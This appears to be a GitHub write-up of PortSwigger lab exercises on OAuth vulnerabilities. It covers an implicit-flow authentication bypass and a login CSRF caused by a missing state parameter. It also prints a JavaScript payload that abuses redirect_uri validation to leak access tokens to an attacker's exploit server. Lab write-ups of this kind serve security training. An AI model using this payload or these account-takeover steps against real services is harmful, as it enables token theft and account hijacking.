<h1>OAuth Vulnerabilities - FOR EDUCATIONAL PURPOSES ONLY</h1>

Most of the OAuth Vulnerabilities happen because OAuth can be configured in many different ways. There are many things that developers need to secure when setting up an OAuth Client.

**ALL DATA IN THESE EXAMPLES ARE FROM PORTSWIGGER TRAINING LABS. NONE OF THE DATA, OR TARGETS ARE REAL HOSTS.**

<h2>Recon</h2>

When you find your target's oauth host name, try to make a request to the following endpoints in order to view the target's OAuth configuration.

<ul>
  <li>/.well-known/oauth-authorization-server</li>
  <li>/.well-known/openid-configuration</li>
</ul>

<img width="1414" height="634" alt="oauth-config-settings" src="https://github.com/user-attachments/assets/254e59d4-54e3-4a51-bf0e-9279cc657995" />

<h2>Authentication bypass via OAuth implicit flow</h2>

Because the implicit flow sends all requests through the user's browser, the user can manipulate the requests sent to the oauth server. For example, in this OAuth flow, the final step is to confirm the access token.
In the confirmation request sent to ```/authentication```, we simply change the username and email address fields to the Victim's email and username, while using the Attacker's access token. The server then gives us a session
token and we are logged in as the Victim user.

<img width="1642" height="623" alt="oauth-authorization-bypass-via-implicit-grant-type-misconfiguration" src="https://github.com/user-attachments/assets/fe89e084-8dbf-4bc1-991c-1480c293ab98" />

<h2>Forced OAuth profile linking - Login CSRF Attack</h2>

Consider a website that allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth. In this case, if the application fails to use the state
parameter, an attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.

<h3>OAuth Code Request URL</h3>

```https://oauth-0aa200b604fb413a80d40bc9020a00d4.oauth-server.net/auth?client_id=rge9co8rimjdbdm2va85l&redirect_uri=https://0a69000e042d414b80e60ddb00690090.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email```

<h3>OAuth Code Confirmation URL</h3>

```https://0a69000e042d414b80e60ddb00690090.web-security-academy.net/oauth-login?code=1YM7umEDX4Rls9YDoNOsAo9WCH3TAg8RdeTqTLab_hr```

The **state** parameter is not present in either request, which allows an Attacker to make a Victim user utilize the Attacker's code, linking the Victim's session to the Attacker's. This gives the Attacker access to the Victim's
account. The Attacker just needs to force the Victim to make a GET request. See the attached image where an Attacker hosts an image tag that forces the Victim to make a GET request that utilizes the Attacker's oauth code.

<img width="1081" height="766" alt="oauth-login-csrf-attack-payload-for-educational-purposes-only" src="https://github.com/user-attachments/assets/9b664abb-a5c2-46e3-b9e6-360644685842" />

<h2>Flawed redirect_uri validation</h2>

If the redirect_uri is not properly validated against a white list of accepted URLs, you can potentially leak the access token from an implicit grant to your attacker controlled server. This might require another vulnerability, like
open redirection or XSS.

Because the implicit grant oauth flow sends the user's access token in the URL in a fragment, you can utilize a script to steal the access token. A script like the one below. Also analyze the images to see the script hosted on
the Attacker's server. When the Victim travels to the Attacker's server, the script is activated and the access token is sent to the Attacker's server, seen in the logs.

```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0ab300bf043163b9803b240c021400dc.oauth-server.net/auth?client_id=ztgy6fj78225qdy3zt4c5&redirect_uri=https://0a68000904786360808826d30089008a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a65009e04386377805b255d01850056.exploit-server.net/exploit&response_type=token&nonce=1097999343&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

<img width="1144" height="799" alt="hosting-the-script-to-steal-the-oauth-access-token_for-educational-purposes-only" src="https://github.com/user-attachments/assets/39bc8c02-f173-435c-a52d-5ae2f0f67db7" />

<img width="1723" height="160" alt="viewing-the-oauth-access-token-in-your-server-logs" src="https://github.com/user-attachments/assets/7f370b4a-9e64-4e22-b0c7-ee4eba3aa48c" />

<img width="1462" height="511" alt="viewing-the-admin-apikey-using-their-oauth-access-token" src="https://github.com/user-attachments/assets/350eeea8-05ef-4582-bf07-cb941e5436a0" />


<h2>Article About OAuth Security Testing</h2>

[Article About OAuth Vulnerabilities Written By COFFSec](https://coffsec.medium.com/10-oauth-misconfiguration-exploits-every-pentester-must-master-ef1f71324faf)
